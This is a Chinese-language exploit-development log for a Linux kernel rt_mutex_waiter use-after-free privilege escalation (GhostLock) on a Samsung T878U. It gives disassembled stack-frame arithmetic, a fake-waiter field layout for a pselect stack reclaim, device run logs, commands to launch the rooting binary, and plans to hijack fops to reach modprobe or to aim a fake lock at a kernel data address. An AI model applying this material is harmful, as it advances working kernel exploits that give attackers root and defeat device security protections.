# pselect 几何对照结论 — 与上游成功实现逐项比对

日期: 2026-10-01
方法: 克隆 4 个上游/移植仓库做源码级对照, 并用本项目 `results/` 全量日志做经验校验。
上游源码本地副本: `../scratch/upstream-refs/`(已 gitignore)。

---

## 1. 结论摘要

> **⚠️ 2026-10-01 决定性更正: 下面第 1–3 条已被内核 ELF 反汇编推翻。**
> 本项目 `PSELECT_WAITER_WORD_SHIFT=16` **是正确的**, 不是配置错误;
> 上游的 `shift=0` 是相对**另一个基准**得到的数字, 不可直接搬用。
> 证据见 **§3.5**。结论: **用默认 shift=16 重跑, 不要再覆盖成 0。**

1. ~~上游成功实现全部用 `shift=0`, 本项目 16 是配置错误。~~
   **错误。** 上游 `fdset_map.h` 的 δ=0 是相对它自己的帧基准; 本项目两条 syscall
   路径的帧大小不同(`0x250` vs `0x260`), 差值 `0x20` 正好把残余 waiter 推到
   `shift=16`。见 §3.5.4。
2. `user_reachable` 是**自洽指标** —— 它只检验"代码自己假设的几何是否落在用户可写区",
   **完全不检验物理几何是否正确**。`shift=0` 的 `user_reachable=1` 是假阳性。
3. `shift=0` 历史上跑过两次(07-21、10-01), 两次都 reboot。10-01 那次的崩溃现在
   可以精确解释 —— 正是几何错位把 `waiter->lock` 写成了 prio 值 `0x82`(近 NULL 解引用),
   见 §4.1。
4. **PANIC_EVIDENCE 的 Round 18「未解异常」可以闭合** —— 见 §5, 不是异常, 是 res-race 语义的必然结果。
5. Round 11 的「无法影响 waiter->lock」结论仍然站不住 —— 见 §6。
6. **下一步就是 §7.1: 用默认 `shift=16` 重跑。**

---

## 2. 上游参考几何(三处独立来源交叉验证)

### 2.1 `cxlfhx/ghostlock-pfem10` — `src/fdset_map.h`(真机 v8 探针校准, 最可信)

目标 5.10 紧凑 waiter(0x50 字节), **与本项目 4.19 的 `struct rt_mutex_waiter` 布局完全一致**:

```
NFDS = 320, wps = 5, shift δ = 0        ← v8 oracle 定案
tree.pc@+0x00 = in[0]    (写值)
tree.right@+0x08 = in[1] (必须 0, Case 1-left)
tree.left@+0x10 = in[2]  (写目标)
pi.pc@+0x18 = in[3]
pi.right@+0x20 = in[4]
pi.left@+0x28 = out[0]
task@+0x30 = out[1]
lock@+0x38 = out[2]
prio@+0x40 = out[3] = 130
deadline@+0x48 = out[4] = 0
```

映射规则(三处一致):
```
global = shift + waiter_word
set = global / wps ,  word = global % wps ,  set 0/1/2 = in/out/ex
```
`shift=0` 时 10 个词全部落在 global 0..9 = `in[0..4] + out[0..4]`, **ex 不参与**。

关键约束(fdset_map.h 原注释):
> 用户态 in/out/ex 是栈上连续局部变量 → 假 waiter 区 = in|out|ex 的字网格。

### 2.2 `JoinChang/ghostlock-oneplus` — `src/core/fops.c` + `target.h`

```c
#define PSELECT_WAITER_WORD_SHIFT 0        // target.h:85
#define PSELECT_ROUTE_NFDS 320             // common.h:146

// fops.c prepare_pselect_fdsets(), 紧凑 10 词分支
struct pselect_waiter_word words_compact[] = {
  {2, 0, "tree_left"}, {3, 0, "pi_parent"}, {4, 0, "pi_right"},
  {5, 0, "pi_left"},   {6, task},           {7, fake_lock},
  {8, 0, "prio"},      {9, 0, "deadline"},
};
```
同样 shift=0, 同样 task@6 / lock@7 / prio@8。`task` 默认取 `text_addr(INIT_TASK)`(真实 init_task),
只有显式开 custom-write 才用 `fake_task`。

### 2.3 `mobilehackinglab/ghostlock-a17`(三星, 有 PANIC_ON_OOPS)

README 明确: 入口原语「pselect stack reclaim + fake `rt_mutex_waiter` + constrained rb-erase
pointer write」**原样继承自 OnePlus 版**。即三星平台上这套几何也是 shift=0 一脉。

---

## 3. 本项目 vs 上游 — 逐项对照

| 项 | 上游 | 本项目 | 判定 |
|---|---|---|---|
| `PSELECT_ROUTE_NFDS` | 320 | 320 | ✅ 一致 |
| `words_per_set` | 5 | 5 | ✅ 一致 |
| `PSELECT_WAITER_WORD_SHIFT` | **0** | **16** (`offset.h:41`, 无条件定义, 生效) | ❌ **分歧** |
| task/lock/prio 词索引 | 6 / 7 / 8 | 6 / 7 / 8 (`fops.c:156-158`) | ✅ 一致 |
| 映射公式 | `global = shift + w` | 同 | ✅ 一致 |
| task/lock/prio 落点 | `out[1] / out[2] / out[3]` | shift=16 → `res_out[2..4]` | ❌ **分歧** |
| `user_reachable` | 1 | **0**(shift=16) | ❌ |
| `task` 取值 | `INIT_TASK`(真实) | `init_task`(Round 6 观察一致) | ✅ 一致 |
| `wake_state` | 紧凑布局无 | 4.19 无此字段 | ✅ 一致 |

**`offset.h` 里的注释把分歧写得很清楚(原文):**

> T878U residual waiter begins at stack word 16 relative to pselect's stack_fds
> ... With words_per_set=5 that places task/lock/prio at global words 22/23/24 =
> res_out[2/3/4]. Those slots are NOT get_fd_set-reachable (only words 0..14 are);
> they are installed by the res-race path.

即: **"waiter 起始于词 16" 是一个未经验证的假设**, 而 PANIC_EVIDENCE 的
Round 7 / 8 / 9 连续三次用 dump 反推该偏移, Round 9 自己承认:

> the residual's true word offset relative to `stack_fds` is **still unmeasured**

上游要求 waiter 必须落在 0..14(否则任何设备都无法利用), 且实测 shift ∈ {0, -2}。
—— 但这是**上游自己镜像**的数字。本项目镜像的帧布局不同, 必须自己算。

---

## 3.5 决定性证据(2026-10-01): 内核 ELF 反汇编栈帧算术

**这一节把几何问题一次性钉死 —— 不再依赖 panic dump, 也不再依赖上游对照。**

数据来源: `firmware_extract/ap/boot_kernel.bin.elf`(带符号、未 strip 的 aarch64 内核, 62 MB),
用 NDK `llvm-objdump` 反汇编。

### 3.5.1 两条 syscall 路径的帧大小

| 符号 | 地址 | 序言 | 帧大小 |
|---|---|---|---|
| `__arm64_sys_futex` | `0xffffff80081911ec` | `sub sp, sp, #0x70` | 0x70 |
| `do_futex` | `0xffffff800818d4ec` | `sub sp, sp, #0x1e0` | 0x1e0 |
| `__arm64_sys_pselect6` | `0xffffff80082e921c` | `sub sp, sp, #0xa0` | 0xa0 |
| `core_sys_select` | `0xffffff80082e85a4` | `sub sp, sp, #0x1c0` | 0x1c0 |

设 syscall 入口 `sp = 0`(同一线程, 内核栈每线程固定, 且本镜像无
`CONFIG_RANDOMIZE_KSTACK_OFFSET`), 则:

```
do_futex 帧基        = 0 - 0x70 - 0x1e0 = -0x250
core_sys_select 帧基 = 0 - 0xa0 - 0x1c0 = -0x260
```

### 3.5.2 `&rt_waiter` 在 do_futex 帧内偏移 = **+0xc0**

`futex_wait_requeue_pi` 在符号表里**不存在** → 被内联进 `do_futex`。
它栈上的 `struct rt_mutex_waiter rt_waiter` 就是 GhostLock 留下的残余。
三处独立锚点全部指向 `sp + 0xc0`:

| 调用点 | 地址 | 传参 | C 原型 |
|---|---|---|---|
| `rt_mutex_init_waiter` | `0xffffff800818e684` | `add x0, sp, #0xc0` | `(struct rt_mutex_waiter *waiter)` |
| `rt_mutex_wait_proxy_lock` | `0xffffff800818e7f4` | `add x2, sp, #0xc0` | `(lock, to, waiter)` |
| `rt_mutex_cleanup_proxy_lock` | `0xffffff800818e814` | `add x1, sp, #0xc0` | `(lock, waiter)` |

→ `&rt_waiter` 绝对地址 = `-0x250 + 0xc0` = **`-0x190`**

### 3.5.3 `stack_fds` 在 core_sys_select 帧内偏移 = **+0x50**

`0xffffff80082e8650: add x19, sp, #0x50`(`stack_fds` = 256 字节, 6 路切分)。

→ `stack_fds` 绝对地址 = `-0x260 + 0x50` = **`-0x210`**

### 3.5.4 相减 —— 得到 16

```
残余 waiter 词 0 相对 stack_fds 的字偏移
    = (-0x190) - (-0x210) = 0x80 = 128 字节 = 16 词
```

**`PSELECT_WAITER_WORD_SHIFT = 16`, 与 `offset.h` 完全一致。**

### 3.5.5 字段落点(shift=16, wps=5)

| waiter 词 | 字段 | global | 落在 | 用户侧来源 |
|---|---|---|---|---|
| 0 | `tree.pc` | 16 | `res_in[1]` | `in[1]` |
| 1 | `tree.right` | 17 | `res_in[2]` | `in[2]` |
| 2 | `tree.left` | 18 | `res_in[3]` | `in[3]` |
| 3 | `pi.pc` | 19 | `res_in[4]` | `in[4]` |
| 4 | `pi.right` | 20 | `res_out[0]` | `out[0]` |
| 5 | `pi.left` | 21 | `res_out[1]` | `out[1]` |
| **6** | **`task`** | **22** | **`res_out[2]`** | **`out[2]`** |
| **7** | **`lock`** | **23** | **`res_out[3]`** | **`out[3]`** |
| **8** | **`prio`** | **24** | **`res_out[4]`** | **`out[4]`** |
| 9 | `deadline` | 25 | `res_ex[0]` | `ex[0]` |

`offset.h` 注释里写的正是 `task/lock/prio @ global 22/23/24 = res_out[2/3/4]` ——
与反汇编**独立吻合**。

### 3.5.6 为什么上游是 0 而这里是 16

上游仓库的 `shift` 是相对**它们自己**的基准(不同内核版本的 syscall wrapper 帧、
`core_sys_select` 帧大小、`stack_fds` 摆放位置都不同)。把上游的 `0` 直接搬到
一个帧布局不同的镜像上, 得到的是**错误的物理位置**。
`user_reachable=1` 只说明"按 shift=0 推出来的位置落在用户可写区", 是**自洽**而非**正确**。

### 3.5.7 附带结论: 残余 waiter 的"所有者帧"

`rt_mutex_start_proxy_lock` 全镜像只有一个调用点(`futex_requeue` 内 `0xffffff8008190464`),
它操作的 `waiter` 来自**等待线程**栈上的 `futex_wait_requeue_pi::rt_waiter`。
该函数在本镜像被内联进 `do_futex`, 因此残余 waiter 住在 **`do_futex` 帧 +0xc0**;
pselect 只是**覆盖**它。这与 §3.5.4 的 16 词位移自洽。

---

## 4. 经验证据 — shift=0 的历史运行

`results/2026-07-21/reroot_20260721_225652/reroot.log`:

```
[*] pselect reach nfds=320 words_per_set=5 shift=0 waiter_words=10
    global=0..9 user_words=0..14 total_words=0..29 bytes_per_set=40
    stack_bitmap=1 user_reachable=1 installable=1
[*] pselect field map task_ok=1 via=out[1] lock_ok=1 via=out[2]
    prio_ok=1 via=out[3] hold_safe=1 res_in0_global=15
[*] pselect place task waiter_word=6 shift=0 global=6 via out[1] value=ffffffc00322d980 bits=36
[*] pselect place lock waiter_word=7 shift=0 global=7 via out[2] value=ffffffc84f3d04d0 bits=41
[*] pselect place prio waiter_word=8 shift=0 global=8 via out[3] value=0000000000000078 bits=4
[*] pselect enter attempt=1 page=ffffffc84f3d0000 lock=ffffffc84f3d04d0
    skip=0 consume_when=post stall=0 thr=0 installable_res_race=1 expect_ready≈81
（无 "pselect returned" → 死在 syscall 内, 随后 reboot）
```

对照同一构建 shift=16 的运行:
```
[*] pselect reach ... shift=16 waiter_words=10 global=16..25 user_words=0..14
    user_reachable=0 installable=0
```

**结论(更正后): `shift=0` 让 `user_reachable=1`, 但那只是自洽指标, 不代表物理几何正确。**
按 §3.5 的帧算术, shift=0 把伪造 waiter 写在 `stack_fds` 词 0..9,
而真正的残余在词 16..25 —— 两者相隔 `0x80` 字节, **完全没有重叠**。

全量统计(所有打印过 `pselect enter` 的运行):

| shift | 运行次数 | 结果 |
|---|---|---|
| 0 | 2(07-21、10-01) | 进入 pselect → reboot |
| 12 | 1 | 进入 pselect → reboot |
| 14 / 15 / 17 | 各 1 | 未进入 syscall |
| **16(默认)** | 40+ | 进入 pselect → reboot |

> 注: Round 4 的 shift 扫描只测了 14/15/16/17, **没有测 0–13**;
> 但"0–13 没测过"不能反推"16 不对" —— §3.5 的反汇编已经直接给出 16。

### 4.1 10-01 那次 shift=0 的崩溃可以精确解释

`results/2026-10-01/reroot_20261001_121339/reroot.log`:

```
[*] pselect place task waiter_word=6 shift=0 global=6 via out[1] value=ffffffc00322d980 bits=36
[*] pselect place lock waiter_word=7 shift=0 global=7 via out[2] value=ffffffc0cc4484d0 bits=37
[*] pselect place prio waiter_word=8 shift=0 global=8 via out[3] value=0000000000000082 bits=2
[*] pselect enter attempt=1 page=ffffffc0cc448000 lock=ffffffc0cc4484d0 ...
（随后 reboot: boot_id 14b44169 → bfda00ce, pstore 为空）
```

shift=0 下 `pselect_map_waiter_word` 把值放进 `out[1]/out[2]/out[3]`,
res-race 于是写 `res_out[1]/[2]/[3]` = global **21/22/23**。
而物理上 `task/lock/prio` 在 global **22/23/24**。**整体低了一个词**:

| global | shift=0 实际写入 | 内核按物理布局读到的字段 |
|---|---|---|
| 21 | task 值 | (在残余之外) |
| 22 | **lock 值** | `waiter->task` |
| 23 | **prio 值 `0x82`** | **`waiter->lock`** |
| 24 | (未写, 被 zero_fd_set 清零) | `waiter->prio` |

→ `rt_mutex_adjust_prio_chain` 读到 `waiter->lock = 0x82`,
`raw_spin_trylock(&((rt_mutex *)0x82)->wait_lock)` 近 NULL 解引用 → oops →
Samsung `PANIC_ON_OOPS` → 重启。**与观测完全一致。**

**用 shift=16 时 `lock` 会正确落在 global 23(`out[3]` → `res_out[3]`), 这就是下一步。**

### 4.2 动态确证(2026-10-01): shift=16 的植入**成功**, 且**不崩**

用默认 shift=16 重跑, 并通过 `IONSTACK_SKIP_CONSUME=1`(关掉 consumer 的
`sched_setattr` 链走)得到一次**无崩溃、可完整读出**的运行:

```
[*] pselect enter attempt=1 ... skip=1 consume_when=skip ... expect_ready≈79
[*] pselect diag word=2 ret=80 errno=0 in=0000000000000000 out=ffffffc00322d980 ex=0000000000000000
[*] pselect diag word=3 ret=80 errno=0 in=0000000000000000 out=ffffffc84ab184d0 ex=0000000000000000
[*] pselect diag word=4 ret=80 errno=0 in=0000000000000001 out=0000000000000082 ex=0000000000000000
[*] pselect returned attempt=1 ret=80 errno=0 expect_ready≈79 paint_ok=1 post_armed=0 spin=0/8000000 calls=0 success=0
（boot_id 不变 → 没有 reboot）
```

**三处读回值与 §3.5.5 的预测逐位吻合:**

| 读回 | 值 | 对应字段 |
|---|---|---|
| `out[2]` | `ffffffc00322d980` | `waiter->task`(=`init_task`) |
| `out[3]` | `ffffffc84ab184d0` | `waiter->lock`(=`fake_lock`) |
| `out[4]` | `0000000000000082` | `waiter->prio`(=130) |

`out[N]` 之所以等于植入值, 是因为 `set_fd_set()` 把内核栈上的 `fds.res_out`
拷回用户 —— 而 `res_out[2..4]` **就是**残余 waiter 的 `task/lock/prio` 三个字段
(`fs/select.c:638-640` + 本文 §3.5)。所以这三行**证明残余确实被植入**。
(更正 §5 的旧说法: `IONSTACK_PSELECT_DIAG` 读回**是**有效 oracle —— 只要几何已知。)

### 4.3 崩溃被隔离到 consumer 的链走, 而不是植入本身

| 配置 | 结果 |
|---|---|
| shift=16 + consumer **开** | 卡在 `pselect enter` 之后, 无 `pselect returned` → reboot |
| shift=16 + `IONSTACK_SKIP_CONSUME=1` | `pselect returned ret=80 paint_ok=1`, **不 reboot** |

→ **植入本身不崩。崩的是 consumer 触发的 `rt_mutex_adjust_prio_chain` 链走。**

链走在 `waiter->lock = fake_lock` 之后要依次读:

```c
raw_spin_lock_irq(&task->pi_lock);
waiter = task->pi_blocked_on;            /* = 残余, 已植入 */
...
if (next_lock != waiter->lock)           /* +0x38 = fake_lock */
    goto out_unlock_pi;
raw_spin_trylock(&lock->wait_lock);      /* struct rt_mutex +0x00 */
owner = rt_mutex_owner(lock);            /* struct rt_mutex +0x18 */
top_waiter = rt_mutex_top_waiter(lock);  /* lock->waiters.rb_leftmost */
```

本镜像 `struct rt_mutex`(`include/linux/rtmutex.h`, 无 DEBUG_RT_MUTEXES/DEBUG_LOCK_ALLOC):

```c
struct rt_mutex {
    raw_spinlock_t        wait_lock;   /* +0x00  4B (qspinlock, val==0 = 未持有) */
    struct rb_root_cached waiters;     /* +0x08  16B (rb_node, rb_leftmost) */
    struct task_struct   *owner;       /* +0x18 */
};
```

**所以下一步是把 `fake_lock`(以及它指向的 `lock->waiters.rb_leftmost`)按上表
完整塑形, 而不是改 shift。** 现有 `fake_lock` 已经是 `page_base + 0x4d0`,
`wait_lock_word=0` / `lock_waiters=1` / `lock_owner_mode=none` 说明塑形代码存在,
需要按 §4.3 的读序逐字段核对。

### 4.4 另一个独立阻塞点: writeonly 阶段 SELinux/EINVAL

同一次 skip-consume 运行继续走到了写阶段, 失败于:

```
[*] writeonly stage enter attempts=1 kaslr_done=1
[+] stage-t878u-writeonly-modprobe-result pid=4682 ok=0 reason=selinux_write ret=-1 errno=22
[*] pselect route done calls=0 success=0 step=41 errno=22
```

`errno=22` = `EINVAL`, 原因标记为 `selinux_write`。这与 pselect 几何**无关**,
是写原语(ashmem fops 劫持 → modprobe)自身的第二个阻塞点, 需要独立解决。

---

## 5. 修正 Round 18「未解异常」

Round 18 的困惑是: pselect 返回 `ret=77 errno=0` 后, 用户 out[] 里仍是植入值,
而"写回应该把 out[3] 覆盖成 `~0UL`"。

**这不是异常, 是 res-race 语义的必然结果。**

res-race 的工作方式:
1. 用户把目标 64 位模式 V 写进 `out[word]`;
2. `open_selected_fds` 只把 **V 中置位的那些 bit 对应的 fd** 打开成可写;
3. `do_select` 对每个"就绪且可写"的 fd 在 `res_out` 置位 → `res_out[word] = V`(恰好等于 V 的位型);
4. `set_fd_set` 把 `res_out` 拷回用户 `out` → 用户看到的值 = V。

所以 `out[3]` 读回等于植入值, 是**正确行为**。只有"该 word 的 64 个 fd 全部打开且就绪"时
才会得到 `~0UL`, 而 res-race 只打开 V 的置位 fd。Round 18 的假设前提有误。

**推论: `IONSTACK_PSELECT_DIAG` 的读回无法区分"植入成功"与"位型恒等"**,
它作为 oracle 是无效的 —— 这解释了 Round 17 为何"读回完好但崩溃值不匹配"。

---

## 6. Round 11 结论仍然不成立

Round 11 判定: `waiter->lock` 的值是内核在阻塞时选定的堆指针, 栈写通道无法影响它,
因此"所有 offset 实验注定失败"。

反证来自 `Thiasap/oppo-pgem10-ghostlock`(OPPO Find X6 Pro, 5.15.149)的崩溃路径记录:

```
__sched_setscheduler → rt_mutex_adjust_pi
  waiter = task->pi_blocked_on      (指向已释放的 UAF waiter)
  next_lock = waiter->lock          (伪造 lock 地址)
  rt_mutex_adjust_prio_chain(task, ..., next_lock, ...)
    raw_spin_trylock(&lock->wait_lock)   ✅ 存活   ← 伪造 lock 生效
    rt_mutex_dequeue(lock, waiter)       ✅
    rt_mutex_enqueue(lock, waiter)       ⚠️
    rt_mutex_enqueue_pi(task, waiter)    ❌ 崩溃(更靠后)
```

`raw_spin_trylock` 存活说明**伪造的 `waiter->lock` 是可以生效的**。
`waiter->lock` 位于残余 `rt_mutex_waiter` 的 +0x38, 是一个栈字;
它之所以当前持有堆指针, 是因为重叠没对上、原始值没被覆盖 —— 不是"物理上不可写"。
本项目 4.19 的 struct 实测(`kernel/locking/rtmutex_common.h`)与 5.10 紧凑布局一致,
`rtmutex.c` 中 `waiter->lock = lock;` 的赋值点也确认存在。

---

## 7. 建议的下一步实验(成本低, 信息量大)

前提: 设备已连接, 序列号 `<DEVICE-SERIAL>`; `IONSTACK_PSELECT_WORD_SHIFT` 已在转发白名单
(`src/device/ionstack_reroot_device.c:2054`), 可直接用环境变量覆盖 `offset.h` 的 16。

### 7.1 用默认 shift=16 重跑(最高优先级 —— 也是唯一正确的配置)

**不要再 `export IONSTACK_PSELECT_WORD_SHIFT`。** 保持 `offset.h` 里的 16。
上一轮 10-01 的失败正是因为按旧版本节把 shift 覆盖成了 0。

```sh
export ANDROID_SERIAL=<DEVICE-SERIAL>
unset IONSTACK_PSELECT_FILL_ALL IONSTACK_ALLOW_UNSAFE_CONSUME
unset IONSTACK_PSELECT_WORD_SHIFT IONSTACK_PSELECT_WAITER_WORD_BIAS IONSTACK_PSELECT_LOCK_WORD
./build/smt878u-ionstack-reroot -s "$ANDROID_SERIAL" --t878u-pselect-route --force
```

判据(必须同时满足才算有效样本):
- 日志出现 `pselect enter`;
- `pselect reach ... shift=16 waiter_words=10 global=16..25`;
- `pselect field map ... task via=out[2] lock via=out[3] prio via=out[4]`;
- `pselect res-race summary ... lock=<fake_lock>`。

本次要盯的三个观测点:
1. `pselect returned ... ret=? expect_ready≈? paint_ok=1` —— 证明 res_out 被写入;
2. `pselect returned ... calls=? success=?` —— consumer(`sched_setattr`)是否触发链走;
3. 是否 reboot。

> 若仍 reboot, 但崩溃点已转移到 `rt_mutex_adjust_prio_chain` **更靠后**的位置
> (即 `waiter->lock` 已生效, 问题变成 fake rt_mutex 的内部字段), 那就是**进展**,
> 形态见 §6 引用的 PGEM10 日志 —— 不是回到原点。

### 7.2 shift 微扫(只在 7.1 出现 `paint_ok=0` / `ret < expect_ready` 时才做)

只有当 res-race 根本没写进去(`paint_ok=0`)时才需要怀疑字段落点, 此时扫 15/16/17。
**不要再扫 0–6** —— §3.5 已证明残余在词 16, 词 0–9 与它相隔 `0x80` 字节, 必然打空。

`scratch/sweep_shift_window.sh` 的脚本头注释("upstream uses shift=0"、
"requires shift in [0,5]")基于**旧结论, 已过时**, 以本文档 §3.5 为准。

### 7.3 若 7.2 全部落空

说明残余 waiter 的偏移不在用户可写窗口内, 此时才需要回到 res-race 或换 reclaim 原语。
届时优先考虑 NebuSec 原版做法: **用 `PR_SET_MM_MAP` 的 auxv 栈缓冲替代 pselect**
(memfd 支撑、跨页边界摆放, 并用 `fallocate(PUNCH_HOLE)` 拉长 `copy_from_user` 窗口),
这样 `waiter->lock` 直接由 auxv qword 决定, 可设为 `&inet6_protos[IPPROTO_UDP] - 8`
这类"选定内核数据地址", 不再依赖栈位图重叠。

---

## 8. 参考仓库

| 仓库 | 本地路径 | 价值 |
|---|---|---|
| `cxlfhx/ghostlock-pfem10` | `scratch/upstream-refs/cxlfhx_ghostlock-pfem10` | `src/fdset_map.h` 真机校准词表; `model/model.c` 主机端 chain-walk 状态机(1510 行, 可在不碰设备的情况下验证几何) |
| `JoinChang/ghostlock-oneplus` | `scratch/upstream-refs/JoinChang_ghostlock-oneplus` | `src/core/fops.c` 完整 pselect 实现; `src/devices/*/offsets.h` 多机型偏移表 |
| `mobilehackinglab/ghostlock-a17` | `scratch/upstream-refs/mobilehackinglab_ghostlock-a17` | 三星 KDP/DEFEX/PANIC_ON_OOPS 应对; `src/core/rwforge_a17.c`、`pipe_reclaim.c` |
| `NebuSec/CyberMeowfia` | `scratch/upstream-refs/NebuSec_CyberMeowfia` | 原版; `IonStack/CVE-2026-43499/poc/poc.c` 含 PR_SET_MM_MAP reclaim |

### 附: 本项目相对上游的有利条件

- `CONFIG_RANDOMIZE_KSTACK_OFFSET` 在 4.19 不存在(5.13 才引入, 已在
  `Kernel_T878USQS8DXE2` 全树确认无匹配)→ 栈复用重叠是确定性的, 无 1/32 猜测。
- 4.19 的 `struct rt_mutex_waiter` 无 `wake_state` / `ww_ctx`, 与上游紧凑布局一致,
  词表可直接借用, 不需要重新推导。
- 无 root 取 panic trace 的手法(`/data/log/dumpstate_lastkmsg_*.log.gz`, world-readable,
  实为 ZIP)是本项目独有发现; 上游移植普遍卡在"拿不到崩溃日志"。

---

## 9. 第五轮(定论)：pselect 路线在本内核上**结构性不可行**；真正的原语是"保持 W 阻塞"

> 本节结论全部由 `Kernel_T878USQS8DXE2/` 源码 + `firmware_extract/ap/boot_kernel.bin.elf`
> 反汇编双向确认, 不依赖任何运行时推测。**它推翻了 §1–§7 中"用 pselect 重涂残余 waiter"
> 这一整条设计。**

### 9.1 源码级证明：`stack_fds` 的 6 个集合布局是刚性的

`fs/select.c:622-648`(4.19 原文, 本内核逐字匹配)：

```c
size = FDS_BYTES(n);              /* = FDS_LONGS(n)*8 = 8*ceil(n/64) 字节 */
bits = stack_fds;
if (size > sizeof(stack_fds) / 6) {   /* sizeof(stack_fds)=SELECT_STACK_ALLOC=256 */
        alloc_size = 6 * size;
        bits = kvmalloc(alloc_size, GFP_KERNEL);   /* ← 堆！不再与内核栈重叠 */
}
fds.in      = bits;            fds.out     = bits +   size;
fds.ex      = bits + 2*size;   fds.res_in  = bits + 3*size;
fds.res_out = bits + 4*size;   fds.res_ex  = bits + 5*size;

get_fd_set(n, inp, fds.in); get_fd_set(n, outp, fds.out); get_fd_set(n, exp, fds.ex);
zero_fd_set(n, fds.res_in); zero_fd_set(n, fds.res_out); zero_fd_set(n, fds.res_ex);
ret = do_select(n, &fds, end_time);
```

两条硬约束：

1. **走栈的条件是 `8*ceil(n/64) <= 42` ⇒ `ceil(n/64) <= 5` ⇒ `n <= 320`。**
   `nfds=320` 恰好是"还留在栈上"的**最大值**。
2. 栈上时 6 个集合共占 `6*wps` 个字(`wps = ceil(n/64)`), 其中
   **用户可写区 = `in/out/ex` = 绝对字 `[0, 3*wps)`, 而 `res_*` = `[3*wps, 6*wps)`。**

本内核实测几何(`SP0` = 进入 `__arm64_sys_*` 时的 sp)：

| 入口 | 包装帧 | `core_sys_select` 帧 | `stack_fds` 绝对位置 | `shift` |
|---|---|---|---|---|
| `__arm64_sys_pselect6` | 0xa0 | 0x1c0 | `SP0 - 0x210` | **16** |
| `__arm64_sys_select` | 0x80 | 0x1c0 | `SP0 - 0x1f0` | **12** |

残余 waiter 的绝对位置由 **futex 侧**决定, 与 select 侧无关：
`__arm64_sys_futex` 帧 0x70 + `do_futex` 帧 0x1e0, `rt_waiter` 在 `do_futex_sp + 0xc0`
⇒ **`waiter = SP0 - 0x190`**(10 字, `[SP0-0x190, SP0-0x140)`)。

**⇒ 要让 `waiter->lock`(waiter 字 7)落进用户可写区, 需要 `3*wps > 23`(pselect) 或
`3*wps > 19`(select), 即 `wps >= 8/7` ⇒ `n >= 449/385` ⇒ 立刻走 `kvmalloc` 堆分配,
`bits` 与内核栈再无任何重叠。两条路都死。**
`nfds=320`(pselect, shift 16)时：用户区 `[0,15)`, waiter 在 `[16,26)` —— **差一个字**。

### 9.2 `res_*` 通道为什么救不了

`do_select` 的涂写顺序(`fs/select.c:485-546`, 已按 `wps=5, shift=16` 展开)：

| 迭代 | `res_in[i]` | `res_out[i]` | `res_ex[i]` | 命中的 waiter 字 |
|---|---|---|---|---|
| 0 | g15 | g20 → **w4 pi_right** | g25 → **w9 deadline** | 2 |
| 1 | g16 → **w0 tree_pc** | g21 → w5 pi_left | g26 | 2 |
| 2 | g17 → **w1 tree_right** | g22 → **w6 task** | g27 | 3 |
| 3 | g18 → **w2 tree_left** | g23 → **w7 lock** | g28 | 3 |
| 4 | g19 → w3 pi_parent | g24 → **w8 prio** | g29 | 3 |

关键事实(`select.c:510-544`)：

* `res_out |= bit` 仅当 `(mask & POLLOUT_SET) && (out & bit)`; 且 `if (res_out) *routp = res_out;`
  —— **只有就绪的位才会被涂**。要涂出任意 64 位图案, 必须让图案里所有置位对应的 fd 都就绪。
* 任何一个就绪位都会 `retval++` ⇒ `select.c:548 if (retval || timed_out || signal_pending(current)) break;`
  ⇒ **`do_select` 立即返回, 不可能阻塞**。
* 于是 `core_sys_select` 立刻走到 `set_fd_set` 并返回 ⇒ 进入 `ret_to_user` ⇒
  `do_notify_resume` 的 **0x1b0 帧覆盖 `[SP0-0x1b0, SP0)`**, 而 waiter 在
  `[SP0-0x190, SP0-0x140)` —— **被完整冲掉**。

**⇒ "涂写要靠就绪, 就绪就要返回, 返回就冲掉" —— 闭环, 无解。**
`IONSTACK_PSELECT_CONSUME_WHEN=pre` 也救不了：消费线程必须命中
"第 3/4 次迭代涂完 → `ret_to_user` 冲栈"之间约 **3–8 µs** 的窗口, 且
早到(`waiter->lock == 0`)和晚到(`== 栈金丝雀`)都会 panic。

**⇒ 结论：`nfds`/`shift`/`fake_lock` 塑形都不是问题所在, 它们一直在追一个不存在的目标。**

### 9.3 上游为什么能成：它的 `shift ≈ 0`

`scratch/upstream-refs/a17/src/core/fops.c`(mobilehackinglab/ghostlock-a17)：

* 用 `select()` 而非 `pselect6()`, 其内核上 waiter 落在 `stack_fds[0..13]`, 即
  **整个 waiter 都在用户可写区**;
* `open_selected_fds()` 把所有被涂的 fd **全部 `dup2` 到同一个空管道读端** ⇒ 永不就绪
  ⇒ `do_select` 走 `poll_schedule_timeout` **阻塞**, 涂写靠 `get_fd_set` 从用户区直接
  拷入, 与就绪无关, 且阻塞期间一直有效;
* 消费线程在 `select()` **之前** `atomic_store(&punch_consume_go, ...)` 上膛,
  经 `route_delay_usec()`(默认 50 ms 级)延时, 落点在 W 睡在 `do_select` 里的时候 ——
  此时 `schedule()`/`__schedule` 帧在 `SP0-0x3xx`, **够不到** `SP0-0x190`。

本内核 `shift = 16`(pselect)/`12`(select), 且栈上 `wps <= 5`, 这两个条件**都无法复制**。

### 9.4 真正的原语(源码确认)：残余 waiter **本来就是完全合法的**

`kernel/locking/rtmutex.c`：

```c
929: static int task_blocks_on_rt_mutex(...)
954:         waiter->task     = task;
955:         waiter->lock     = lock;
956:         waiter->prio     = task->prio;
957:         waiter->deadline = task->dl.deadline;
962:         rt_mutex_enqueue(lock, waiter);
964:         task->pi_blocked_on = waiter;          // ← W 的字段被设上

1068: static void remove_waiter(struct rt_mutex *lock, struct rt_mutex_waiter *waiter)
1077:         raw_spin_lock(&current->pi_lock);
1078:         rt_mutex_dequeue(lock, waiter);
1079:         current->pi_blocked_on = NULL;         // ← BUG：应为 waiter->task->pi_blocked_on
1086:         if (!owner || !is_top_waiter) return;  // ← 提前返回，后面全不做
```

**`remove_waiter()` 从头到尾没有清 `waiter->task/lock/prio/deadline`。**
所以只要 `remove_waiter` 是**别人**(`current != waiter->task`)调用的, 残余 waiter 就
仍然是一个**完全合法**的 waiter：`task=W`、`lock=&pi_state->pi_mutex`、`prio=W 阻塞时的 prio`。

`kernel/futex.c` 确认了"别人"是谁：

* `2156` `futex_requeue()` 调 `rt_mutex_start_proxy_lock(&pi_state->pi_mutex, this->rt_waiter, this->task)`
  —— `this->rt_waiter`/`this->task` 来自 **W 的 `futex_q`**, 而 `current` 是**发起
  `FUTEX_CMP_REQUEUE_PI` 的 M** ⇒ `remove_waiter` 清的是 **M** 的字段 ⇒ **W 的
  `pi_blocked_on` 悬挂**。这就是 UAF 本体。
* `1797 rt_mutex_start_proxy_lock()`：`if (unlikely(ret)) remove_waiter(lock, waiter);`
